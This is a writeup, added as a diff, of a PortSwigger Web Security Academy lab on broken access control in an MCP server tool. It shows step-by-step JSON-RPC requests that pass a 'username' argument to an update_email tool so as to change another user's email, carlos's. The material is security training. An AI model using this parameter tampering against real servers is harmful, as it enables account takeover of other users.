@@ -1,0 +1,283 @@
+---
+title: "Broken access control in an MCP server tool"
+description: "PortSwigger Web Security Academy lab — broken access control in an MCP server tool's update_email function, abused to change another user's email address."
+date: "2026-11-24"
+difficulty: "apprentice"
+published: true
+---
+
+# Broken access control in an MCP server tool
+
+[Lab link](https://portswigger.net/web-security/mcp/lab-broken-access-control-in-an-mcp-tool)
+
+Prerequisite: Familiarity with broken access control
+
+- [Broken access control](https://portswigger.net/web-security/access-control)
+- Previous lab: [SQL injection in an MCP server tool](https://portswigger.net/web-security/mcp/lab-sql-injection-in-an-mcp-tool) — [writeup](/writeups/portswigger/mcp-server-vulnerabilities/sql-injection-in-mcp-server-tool)
+
+---
+
+## Lab: Broken access control in an MCP server tool
+
+This lab is a shop which has an MCP endpoint at `/mcp`, shows the API key on the account page, and the email change function is vulnerable to broken access control.
+
+We start by visiting the site and logging in with `wiener:peter`. Now there's no part of the front end that has an MCP button or whatever, so open Burp Suite, intercept a request and send it to your repeater.
+
+From the academy lesson, we already have an idea of what to do. Then change the path to `/mcp`, the method to `POST`, then add the header `Content-Type: application/json`.
+
+We build on the knowledge we gained from the first lab.
+
+Send a call for a tool list request in your request body:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/list"
+}
+```
+
+We get an unauthorized error. Going back to the lab's homepage, we get a hint:
+
+<div className="max-w-[720px] mx-auto">
+
+![401 Unauthorized response to tools/list](/images/writeups/portswigger/mcp-bac-401.png)
+
+</div>
+
+> Send your API key in an `Authorization: Bearer` header. Read each tool's input schema carefully, including any arguments that a normal client wouldn't need to send.
+
+Create a new request header `Authorization: Bearer apikey`.
+
+On logging in to your account `wiener:peter` you get your API key on your account page.
+
+<div className="max-w-[420px] mx-auto">
+
+![Account page showing the API key](/images/writeups/portswigger/mcp-bac-api-key.png)
+
+</div>
+
+Resend the request, with the new header:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "tools": [
+      {
+        "name": "list_products",
+        "title": "List products",
+        "description": "Lists the products currently for sale. Optionally filter by category, for example \"Gifts\".",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "category": {
+              "description": "Only return products in this category",
+              "type": "string"
+            }
+          },
+          "required": [],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_product",
+        "title": "Get product",
+        "description": "Gets the details of a single product by its ID.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "productId": {
+              "description": "The product ID",
+              "type": "string"
+            }
+          },
+          "required": ["productId"],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_account_details",
+        "title": "Get account details",
+        "description": "Gets the username and email address of your account.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {},
+          "required": [],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "update_email",
+        "title": "Update email",
+        "description": "Updates the email address on your account.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "email": {
+              "description": "The new email address",
+              "type": "string"
+            },
+            "username": {
+              "description": "The account to update. Defaults to your account.",
+              "type": "string"
+            }
+          },
+          "required": ["email"],
+          "additionalProperties": false
+        }
+      }
+    ]
+  }
+}
+```
+
+Here we see `list_products`, `get_product`, `get_account_details` and `update_email`.
+
+We're already familiar with what `list_products` and `get_product` can do from the previous lab, so now test `get_account_details`:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "get_account_details"
+  }
+}
+```
+
+It returns a response containing our username and email address:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "{\n  \"username\": \"wiener\",\n  \"email\": \"wiener@normal-user.net\"\n}"
+      }
+    ],
+    "isError": false
+  }
+}
+```
+
+Now let's test `update_email`:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "update_email"
+  }
+}
+```
+
+Its response gives us more details on how to construct our request:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "email is required"
+      }
+    ],
+    "isError": true
+  }
+}
+```
+
+Now we know we should add arguments `email` or `username`. With this knowledge let's update our email:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "update_email",
+    "arguments": {
+      "email": "email@portswigger.com"
+    }
+  }
+}
+```
+
+We get a response showing the email change was successful:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "Email updated for wiener"
+      }
+    ],
+    "isError": false
+  }
+}
+```
+
+<div className="max-w-[420px] mx-auto">
+
+![Account page showing the updated email](/images/writeups/portswigger/mcp-bac-email-updated.png)
+
+</div>
+
+To solve the lab, we're asked to use the MCP server to change the user Carlos's email.
+
+Remember the email change function also takes `username`, so let's add it and instead of adding ours, which is `wiener`, we add `carlos`:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "update_email",
+    "arguments": {
+      "email": "email2@portswigger.com",
+      "username": "carlos"
+    }
+  }
+}
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "Email updated for carlos"
+      }
+    ],
+    "isError": false
+  }
+}
+```
+
+From the response we can see "Email updated for carlos", which shows we've successfully solved the lab.
+
+<div className="max-w-[420px] mx-auto">
+
+![Congratulations, you solved the lab!](/images/writeups/portswigger/mcp-bac-solved.png)
+
+</div>
+
+Thanks for reading.
